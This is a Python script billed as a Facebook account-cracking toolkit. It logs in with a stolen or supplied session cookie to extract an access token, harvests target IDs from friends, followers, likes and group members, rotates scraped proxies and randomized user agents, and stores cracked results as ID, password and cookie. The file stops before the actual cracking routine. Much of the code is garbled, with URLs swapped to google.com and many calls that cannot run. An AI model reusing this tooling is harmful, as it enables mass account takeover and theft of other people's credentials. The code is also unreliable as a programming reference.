#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
import datetime
import os
import sys
import time
import fileinput
from shlex import quote as shlex_quote

try:
    from queue import Queue
except ImportError:
    from Queue import Queue

try:
    import requests
except ImportError:
    sys.exit()

try:
    import rich
    import leg
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
# UA LIST
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxiesprotocol=socks4timeout=100000country=allssl=allanonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
#os.system('rm -rf .prox.txt')

for xd in range(1000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#   ugen2.append(uaku)

for jiah in range(1000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='SAMSUNG SM-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(678, 9999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#   g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;com.facebook.orca;com.facebook.lite;com.facebook.katana FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
#   uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for bb in range(1000):

    a='BlackBerry'
    b=random.randrange(4000, 9999)
    c=random.randrange(1,6)
    d=random.choice(['0','1','2','3','4','5','6'])
    e='0'
    f=random.randrange(100, 999)
    g='Profile/MIDP-'
    h='2'
    i=random.choice(['0','1'])
    j='Configuration/CLDC-1.1'
    k='VendorID/'
    l=random.randrange(100, 999)
    ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'
    ugen2.append(ua)

def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
        ua=open('.bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un)
        ua=open('.bbnew.txt','r').read().splitlines()

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
    try:
        cokbru=open('.cookie.txt').read()
        cokbrut.append(cokbru)
    except:
        login_lagi334()
    # COLORS
    x = '\33[m' # DEFAULT
    k = '\033[93m' # KUNING
    h = '\x1b[1;92m' # HIJAU
    hh = '\033[32m' # HIJAU -
    u = '\033[95m' # UNGU
    kk = '\033[33m' # KUNING -
    b = '\33[1;96m' # BIRU -
    p = '\x1b[0;34m' # BIRU
    # Converter Bulan
    dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
    dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
    tgl = datetime.datetime.now().day
    bln = dic[(str(datetime.datetime.now().month))]
    thn = datetime.datetime.now().year
    okc = 'OK-', str(tgl), '-', str(bln), '-', str(thn), '.txt'
    cpc = 'CP-', str(tgl), '-', str(bln), '-', str(thn), '.txt'
    tpc = 'TAP-A2F-', str(tgl), '-',str(bln), '-', str(thn), '.txt'
# CLEAR
def clear():
    os.system('clear')
# BACK
def back():
    login()
# BANNER
def banner():
    clear()
    wel='# WELCOME TO FACEBOOK CRACK TOOL'
    cik2=mark(wel ,style='bold cyan')
    sol().print(cik2)


    ban='''{}{}
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@
@@@@@&    @@@@@(    &X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@
@@@@      &@ ,@      @@@   &@ @,@(@   @%X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@
@@@@       (          @@@@@@@@@@@ @..@@.@    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@                  @@@@@@@@@@@ @  @  @    @@@@@@@@@@@@@@@@@@@@@@@@@
@@@                    @@@@@@@@@@& . ,#*. (X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>
@@@@        @@       .X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@
@@@@@@    @@@@      @@@  @@@     &     @@,  @@@@   @@  @,  @@@@@@@@@@@
@@@@@@      @@      @@  ( @@@  @@@@  @@@% @  @  @@@@@    @@@@@@@@@@@@@
@@@@@@      @@      @  @@  @@  @@@@  @@@ @@@ .@    @@  @&  @@@@@@@@@@@
@@@@@@@     @@     X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X   NOLEP ARMY
@@@@@@@            X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@     TOOLKITS By Miftah45
X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>X>X<X>X<X>X<X>X 1-ATTACK!! X<X>X<X>X<X>@@@@@@@@@@@@@@@@

                [#] DoubleAttack  - 1-ATTACK TOOLSKIT [#]
                            [NolepArmy Version v2.5]
                            [Author Name] : Miftah45  
                                                          
one-attack!!  '''
    oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
    cetak(nel(oi, title='[bold cyan] • DEVELOVER INFORMATION • [/bold cyan]'))
# VALIDASI TOKEN
def login():
    if 'sukses' in lisensiku:
#       uaku()
        cocok()
        try:
            token = open('pwd','r').read()
            tokenku.append(token)
            try:
                sy = requests.get(host, tokenku[0],cookies={'cookie': cokbrut[0]})
                sy2 = json.loads(sy.text)['name']
                sy3 = json.loads(sy.text)['id']
                menu(sy2,sy3)
            except KeyError:
                login_lagi334()
            except requests.exceptions.ConnectionError:
                banner()
                li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                lo = mark(li, style='red')
                sol().print(lo, style='cyan')
                exit()
        except IOError:
            login_lagi334()
    else:lisensi()

# LOGIN
def login_lagi334():
    banner()
    sky = '[bold cyan][01] LOGIN COOKIE V1\n[02] LOGIN COOKIE V2[/bold cyan]'
    sky2 = nel(sky, style='cyan')
#   cetak(nel(sky2,title='[bold cyan] • LOGIN MENU • [/bold cyan]'))
#   pil=input('[•] Choose : ')
    pil='1'
    if pil in ['1','01']:
        try:
            cik='# LOGIN USING COOKIE'
            cik2=mark(cik ,style='cyan')
            sol().print(cik2)
            cooki=input("Cookie : ")
            open('.cookie.txt','w').write(cooki)
            head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
            data = requests.get("https://business.google.com/business_locations", headers =head, cookies = {"cookie":cooki})
            find_token = re.search("(EAAG\w )", data.text)
            ken=open(".pwd", "w").write(find_token.group(1))
            cokrom=open('.cookie.txt','r').read()
            tokrom=open('.pwd','r').read()
            tes = requests.get(host, tokrom,cookies={'cookie': cokrom})
            tes3 = json.loads(tes.text)['id']
            cik='# LOGIN SUCCESSFUL, RUN AGAIN '
            cik2=mark(cik ,style='green')
            sol().print(cik2)
            login()
        except Exception as e:
            os.system("rm -f .pwd")
            os.system("rm -rf .cookie.txt")
            cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
            cik2=mark(cik ,style='green')
            sol().print(cik2)
            exit()
    elif pil in ['2','02']:
        try:
            cik='# LOGIN USING COOKIE V2 '
            cik2=mark(cik ,style='cyan')
            sol().print(cik2)
            cookie=input("[•] Cookie : ")
            headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
            ses=requests.Session()
            req = ses.get('https://web.google.com/adsmanager?_rdc=1_rdr', headers = headers,cookies={'cookie': cookie})
            cari_id = re.findall('act=(.*?)nav_source', req.text)
            for bn in cari_id:
                rex = ses.get(f'pass.txt', headers = headers,cookies={'cookie': cookie})
                token = re.search('(EAAB\w )', rex.text).group(1)
                ken=open(".pwd", "w").write(token)
            cik='# LOGIN SUCCESSFUL, RUN AGAIN '
            cik2=mark(cik ,style='green')
            sol().print(cik2)
            exit()
        except Exception as e:
            os.system("rm -f .pwd")
            cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
            cik2=mark(cik ,style='green')
            sol().print(cik2)
            exit()



#VALIDASI LISENSI
def anoun():
    res=requests.Session().get(host).json()
    stanoun=res['status']
    if stanoun== "ON":
        oi = nel(tekz(str(res['isi']), justify="center"), style='yellow')
        cetak(nel(oi, title='[bold cyan] • INFORMATION • [/bold cyan]'))
        cik='# PRESS ENTER TO CONTINUE'
        cik2=mark(cik ,style='cyan')
        sol().print(cik2)
        en=input(' ')
    else:pass
    login()
def tlisensi():
    banner()
    wel='# LICENSE IS NOT APPLICABLE OR WRONG'
    wel2 = mark(wel, style='red')
    sol().print(wel2)
    time.sleep(2)
    lisen=input('[•] Enter License : ')
    open('.lisen.txt','w').write(lisen)
    lisensi()


def lisensi():
    try:
        cek=open('.lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=requests.get(host, lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LICENSE APPLICABLE '
        wel2 = mark(wel, style='cyan')
        sol().print(wel2)
        time.sleep(2)
        lisensiku.append("sukses")
    else:
        tlisensi()
    anoun()

# MENU
def menu(my_name,my_id):
    try:sh = requests.get('https://httpbin.org/ip').json()
    except:sh = {'origin':'-'}
    try:
        tglx = my_birthday.split('/')[1]
        blnx = dic2[str(my_birthday.split('/')[0])]
        thnx = my_birthday.split('/')[2]
        birth = tglx, ' ', blnx, ' ', thnx
    except:birth = '-'
    banner()
    sg = '# USER ACCOUNT INFORMATION'
    fx = mark(sg, style='green')
    sol().print(fx)
    print(x, '[', h, '•', x, '] ACTIVE USER : ', str(my_name))
    print(x, '[', h, '•', x, '] USER ID     : ', str(my_id))
    print(x, '[', h, '•', x, '] IP ADDRESS  : ', str(sh['origin']))
    io = '''[bold cyan][01] PUBLIC FRIENDS       [06] CRACK FROM FILES
[02] PUBLIC FRIENDS (BULK)   [07] CHECK CHECKPOINT OPTIONS
[03] FOLLOWER            [08] CHECK CRACK RESULTS
[04] LIKES THE POST      [09] TIPS CRACK
[05] GROUP MEMBERS           [00] LOGOUT[bold cyan]'''
    oi = nel(io, style='cyan')
    cetak(nel(oi, title='[bold cyan] • MENU CRACK • [/bold cyan]'))
    ec = input(x)
    if ec in ['1','01']:
        dump_publik()
    elif ec in ['2','02']:
        dump_massal()
    elif ec in ['3','03']:
        dump_pengikut()
    elif ec in ['4','04']:
        dump_likes()
    elif ec in ['5','05']:
        dump_grup()
    elif ec in ['6','06']:
        crack_file()
    elif ec in ['7','07']:
        file()
    elif ec in ['8','08']:
        result()
    elif ec in ['9','09']:
        tipsx()
    elif ec in ['0','00']:
        os.system('rm -rf .pwd')
        os.system('rm -rf .cookie.txt')
        print(x, '[', h, '•', x, '] WAIT • • •')
        time.sleep(1)
        sw = '# SUCCESS OUT'
        sol().print(mark(sw, style='cyan'))
        exit()
    else:
        ric = '# OPTION NOT IN THE MENU'
        sol().print(mark(ric, style='red'))
        exit()

# RESULT CHECKER
def result():
    cek = '# CEK RESULT CRACK'
    sol().print(mark(cek, style='green'))
    kayes = '[bold cyan][01] CHECK CP RESULTS\n[02] CHECK OK RESULTS\n[00] BACK TO MENU[/bold cyan]'
    kis = nel(kayes, style='cyan')
    cetak(nel(kis, title='RESULTS'))
    kz = input(x)
    if kz in ['1','01']:
        try:vin = os.listdir('/root/bin/CP').write(idf, )
        except FileNotFoundError:
            gada = '# STORAGE NOT FOUND '
            sol().print(mark(gada, style='red'))
            time.sleep(2)
            back()
        if len(vin)==0:
            haha = '# YOU DONT HAVE CP RESULTS'
            sol().print(mark(haha, style='yellow'))
            time.sleep(2)
            back()
        else:
            gerr = '# YOUR CP RESULT'
            sol().print(mark(gerr, style='cyan'))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open.readlines()
                except:continue
                cih =1
                if cih<10:
                    nom = '0', str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('[', nom, '] ', isi, ' [ ', str(len(hem)),' Account ]', x)
                else:
                    lol.update({str(cih):str(isi)})
                    print('[', str(cih), '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
            gerr2 = '# SELECT RESULTS TO SHOW'
            sol().print(mark(gerr2, style='green'))
            geeh = input(x)
            try:geh = lol[geeh]
            except KeyError:
                ric = '# OPTION NOT IN THE MENU'
                sol().print(mark(ric, style='red'))
                exit()
            try:lin = open.read().splitlines()
            except:
                hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()
            akun = '# YOUR CP ACCOUNT RESULT'
            sol().print(mark(akun, style='cyan'))
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
                sol().print(mark(cpkuh,style="yellow"))
                nocp  =1
            akun2 = '# YOUR CP ACCOUNT RESULT'
            sol().print(mark(akun, style='cyan'))
            input('[PRESS ENTER TO RETURN]')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('/root/bin/OK').write(idf, )
        except FileNotFoundError:
            gada = '# STORAGE NOT FOUND '
            sol().print(mark(gada, style='red'))
            time.sleep(2)
            back()
        if len(vin)==0:
            haha = '# YOU DONT HAVE OK RESULTS'
            sol().print(mark(haha, style='yellow'))
            time.sleep(2)
            back()
        else:
            gerr = '# YOUR OK RESULT'
            sol().print(mark(gerr, style='green'))
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open.readlines()
                except:continue
                cih = 1
                if cih<100:
                    nom = '0', str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('[', nom, '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
                else:
                    lol.update({str(cih):str(isi)})
                    print('[', nom, '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
            gerr2 = '# SELECT RESULTS TO SHOW'
            sol().print(mark(gerr2, style='green'))
            geeh = input(x)
            try:geh = lol[geeh]
            except KeyError:
                ric = '# OPTION NOT IN THE MENU'
                sol().print(mark(ric, style='red'))
                exit()
            try:lin = open.read().splitlines()
            except:
                hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()
            akun = '# YOUR OK ACCOUNT RESULT'
            sol().print(mark(akun, style='green'))
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
                sol().print(mark(cpkuh,style="green"))
                print(f'{hh}COOKIE : {x}{cpkuni[2]}')
                nocp  =1
            akun2 = '# YOUR OK ACCOUNT RESULT'
            sol().print(mark(akun, style='green'))
            input('[PRESS ENTER TO RETURN]')
            back()
    elif kz in ['0','00']:
        back()
    else:
        ric = '# OPTION NOT IN THE MENU'
        sol().print(mark(ric, style='red'))
        exit()

# OPEN
def file():
    tek = '# CHECK CEKPOINT FROM FILE'
    sol().print(mark(tek, style='cyan'), style='on red')
    print(x, '[', h, '•', x, '] READING THE FILE, WAIT A MINUTE •••')
    time.sleep(2)
    teks = '# SELECT FILES TO CHECK'
    sol().print(mark(teks, style='cyan'))
    my_files = []
    try:
        lis = os.listdir('/root/bin/CP').write(idf, )
        for kt in lis:
            my_files.append(kt)
    except:pass
    if len(my_files)==0:
        yy = '# YOU DONT HAVE THE RESULTS TO CHECK'
        sol().print(mark(yy, style='red'))
        exit()
    else:
        cih = 0
        lol = {}
        for isi in my_files:
            try:hem = open.readlines()
            except:
                try:hem = open.readlines()
                except:continue
            cih =1
            if cih<10:
                nom = '0', str(cih)
                lol.update({str(cih):str(isi)})
                lol.update({nom:str(isi)})
                print('[', nom, '] ', isi, ' [ ', str(len(hem)), ' Account ]', )
            else:
                lol.update({str(cih):str(isi)})
                print('[', str(cih), '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
        teks2 = '# SELECT FILES TO CHECK'
        sol().print(mark(teks2, style='cyan'))
        geeh = input(x)
        try:geh = lol[geeh]
        except KeyError:
            ric = '# OPTION NOT IN THE MENU'
            sol().print(mark(ric, style='red'))
            exit()
        try:
            hf = open.readlines()
            for fz in hf:
                akun.append(fz.replace('\n',''))
            cek_opsi()
        except IOError:
            try:
                hf = open.readlines()
                for fz in hf:
                    akun.append(fz.replace('\n',''))
                cek_opsi()
            except IOError:
                hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
                sol().print(mark(hehe, style='red'))
                time.sleep(2)
                back()

# DUMP ID PUBLIK
def dump_publik():
    try:
        token = open('.pwd','r').read()
    except IOError:
        exit()
    win = '# DUMP PUBLIC ID'
    win2 = mark(win, style='green')
    sol().print(win2)
    print(x, '[', h, '•', x, '] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
    pil = input(x)
    dumpdump(pil)
    print(x, '[', h, '•', x, '] TOTAL : ', str(len(id)))
    setting()
def dumpdump(pil):
    try:
        head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
        koh2 = requests.get('https://graph.google.com/v1.0/', pil,'?fields=friends.limit(5000){id,name}access_token=', tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
        try:
            kohe=koh2['friends']['paging']['cursors']['before']
        except:
            pass
        for pi in koh2['friends']['data']:
            try:
                iso=(pi,'id', '|', pi,'name', '|', pi, 'birthday')
                if iso in id:pass
                else:id.append(iso)
            except:
                iso=(pi,'id', '|', pi,'name')
                if iso in id:pass
                else:id.append(iso)
                continue
    except requests.exceptions.ConnectionError:
        li = '# PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        input('')
    except (KeyError,IOError):
            pass
# DUMP ID MASSAL
def dump_massal():
    mas='[01] BULK CRACK FROM FILES\n[02] MANUAL BULK CRACK'
    mas2=nel(mas,style='cyan')
    cetak(nel(mas2,title=' • BULK MENU •'))
    pilih=input('[•] Choose : ')
    if pilih in ['1','01']:
        nmfil=input('[•] File Name : ')
        nmfile=open(nmfil,'r').read().splitlines()
        for xfil in nmfile:
            uid.append(xfil)
    elif pilih in ['2','02']:
        print(x, '[', '•', '] ENTER TOTAL ID LIMIT [20]')
        try:
            jum = int(input(x))
        except ValueError:
            pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
            pesan2 = mark(pesan, style='red')
            sol().print(pesan2)
            exit()
        if jum<1 or jum>20:
            pesan = '# OUT OF RANGE MEN'
            pesan2 = mark(pesan, style='red')
            sol().print(pesan2)
            exit()
        ses=requests.Session()
        yz = 0
        print(x), '[', h, '•', x, '] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS'
        for met in range(jum):
            yz =1
            kl = input(x)
            uid.append(kl)
    sed='# WAIT COLLECTING ID'
    sol().print(mark(sed, style='green'))
    for userr in uid:
        dumpdump(userr)
    tot = '# SUCCESSFUL COLLECTING  %s ID'%(len(id))
    if len(id)==0:
        tot2 = mark(tot, style='red')
    else:
        tot2 = mark(tot, style='green')
    sol().print(tot2)
    setting()
#DUMP PENGIKUT
def dump_pengikut():
    try:
        token = open('.pwd','r').read()
    except IOError:
        exit()
    win = '# DUMP ID FROM FOLLOWERS'
    win2 = mark(win, style='green')
    sol().print(win2)
    print(x), '[', '•', '] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS'
    pil = input(x)
    try:
        koh2 = requests.get('https://graph.google.com/', pil, '?fields=subscribers.limit(99999)access_token=', tokenku[0],cookies={'cookie': cokbrut[0]}).json()
        for pi in koh2['subscribers']['data']:
            try:id.append(pi['id'])
            except:continue
        print(x, '[', '•', '] TOTAL : ', str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except (KeyError,IOError):
        teks = '# FAILED DUMP OR BROKEN TOKEN'
        teks2 = mark(teks, style='red')
        sol().print(teks2)
        exit()
#DUMP LIKES
def dump_likes():
    try:
        token = open('.pwd','r').read()
    except IOError:
        exit()
    win = '# DUMP ID FROM LIKE POST'
    win2 = mark(win, style='green')
    sol().print(win2)
    pil = input(x)
    try:
        koh2 = requests.get('https://graph.google.com/v1.0/', '?fields=likes.limit(10000)access_token=', tokenku[0],cookies={'cookie': cokbrut[0]}).json()
        for pi in koh2['likes']['data']:
            try:id.append(pi,)
            except:continue
        print(x, '[', '•', '] TOTAL : ', str(len(id)))
        setting()
    except requests.exceptions.ConnectionError:
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, style='red')
        sol().print(lo, style='cyan')
        exit()
    except (KeyError,IOError):
        teks = '# POST IS NOT PUBLIC OR TOKEN BROKEN'
        teks2 = mark(teks, style='red')
        sol().print(teks2)
        exit()

#DUMPS GRUP
def dump_grup():
    au = '# MAKE SURE THE PUBLIC GROUP ID IS NOT PRIVATE'
    au2 = mark(au, style='cyan')
    sol().print(au2)
    idgrup = input("[•] INPUT ID/USERNAME GRUP : ")
    link = "https://mbasic.google.com/groups/", idgrup
    ses = requests.Session()
    try:
        res = sop(ses.get( headers={"user-agent": 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'}).text, "html.parser")
    except requests.exceptions.ConnectionError:
        au = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        au2 = mark(win, style='cyan')
        sol().print(au2)
        time.sleep(0.5)
        exit()
    titt = res.find("title")
    titt2 = titt.text.replace(" | Facebook","").replace(" Grup Publik","")
    if titt2=='Masuk Facebook':
        au = '# LIMIT ON OFF AIRPLANE MODE  TRY AGAIN'
        au2 = mark(win, style='red')
        sol().print(au2)
        time.sleep(0.5)
        exit()
    elif titt2=='Kesalahan':
        au = '# GROUP NOT FOUND'
        au2 = mark(win, style='yellow')
        sol().print(au2)
        time.sleep(0.5)
        exit()
    else:pass
    xxb = res.find_all('table')
    totid = []
    for xb in xxb:
        totalid = xb.text
        tottalid = totalid.replace('Anggota','')
        try:
            jumid = int(tottalid)
            totid.append(jumid)
        except:
            pass
    au = 'GROUP NAME    : ', titt2, '\n' 'GROUP MEMBER : ', str(totid[0])
    oi = nel(au, style='cyan')
    cetak(nel(oi, title='[bold cyan] • GROUP TARGET •[/bold cyan]'))
    au = '[•] TO STOP PRESS CTRL C\n[•] IF STUCK ON OF AIRPLANE MODE'
    oi = nel(au, style='cyan')
    cetak(nel(oi, title='[bold cyan] • SUGGESTION •[/bold cyan]'))
    linkm='https://mbasic.google.com/browse/group/members/?id=', idgrup
    pulkanid(linkm)
def pulkanid(linkmem):
    member=ses.get(linkmem,cookies={'cookie': cokbrut[0]},headers={'user_agent': ''}).text
    memberr=re.findall('<h3aclass"..\"href\"(.*?)\"(.*?)<a',member)
    for mem in memberr:
        if "profile.php?" in mem[0]:
            id.append(re.findall("id=(.*)",mem[0])[0], )
        else:
            id.append(mem[0], )
        sys.stdout.write('\r [•] COLLECTING  %s ID'%(len(id))); sys.stdout.flush()
    if "Lihat Selengkapnya" in member:
        time.sleep(2)
        pulkanid('https://mbasic.google.com')
    else:
        def geh(gey):
            try:
                a=requests.get(gey,cookies={'cookie': cokbrut[0]}).text
                b=re.findall('<h3lass=.*?">s<n>st<ng>a<ef \"/(.=)\">(.*?)</a/str>g<',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            if d in id:
                                continue
                            else:
                                id.append(d, )
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d,)
                        sys.stdout.write('\r  [•] COLLECTING %s ID'%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh('https://mbasic.google.com',)
                else:
                    print('\n')
                    setting()
            except requests.exceptions.ConnectionError:
                time.sleep(15)
                geh(gey)
            except KeyboardInterrupt:
                print('\n')
                setting()
        geh(f"https://mbasic.google.com/groups/")
def crack_file():
    cek = '# CRACK FROM FILE DUMP'
    sol().print(mark(cek, style='green'))
    try:vin = os.listdir('/root/bin/DUMP').write(idf, )
    except FileNotFoundError:
        gada = '# STORAGE NOT FOUND '
        sol().print(mark(gada, style='red'))
        time.sleep(2)
        back()
    if len(vin)==0:
        haha = '# YOU DONT HAVE FILE DUMP RESULTS'
        sol().print(mark(haha, style='yellow'))
        time.sleep(2)
        back()
    else:
        gerr = '# YOUR FILE DUMP RESULT'
        sol().print(mark(gerr, style='cyan'))
        cih = 0
        lol = {}
        for isi in vin:
            try:hem = open.readlines()
            except:continue
            if cih<10:
                nom = '0', str(cih)
                lol.update({str(cih):str(isi)})
                lol.update({nom:str(isi)})
                print('[', nom, '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
            else:
                lol.update({str(cih):str(isi)})
                print('[', str(cih), '] ', isi, ' [ ', str(len(hem)), ' Account ]', x)
        gerr2 = '# SELECT RESULTS TO START CRACK'
        sol().print(mark(gerr2, style='green'))
        geeh = input(x)
        try:geh = lol[geeh]
        except KeyError:
            ric = '# OPTION NOT IN THE MENU'
            sol().print(mark(ric, style='red'))
            exit()
        try:lin = open.read().splitlines()
        except:
            hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
            sol().print(mark(hehe, style='red'))
            time.sleep(2)
            back()
        for xid in lin:
            id.append(xid)
        setting()
def tipsx():
    print('NEXT UPDATE BRO')


# PENGATURAN ID
def setting():
    wl = '# ID SEQUENCE SETTINGS'
    sol().print(mark(wl, style='green'))
    teks = '[01] CRACK FROM THE OLDEST ACCOUNT\n[02] CRACK FROM THE YOUNGEST ACCOUNT\n[03] CRACK RANDOM ID'
    tak = nel(teks, style='cyan')
    cetak(nel(tak, title=' • SETTING • '))
    hu = input(x)
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        ric = '# OPTION NOT IN THE MENU'
        sol().print(mark(ric, style='red'))
        exit()
    met = '# CHOOSE CRACK METHOD'
    sol().print(mark(met, style='green'))
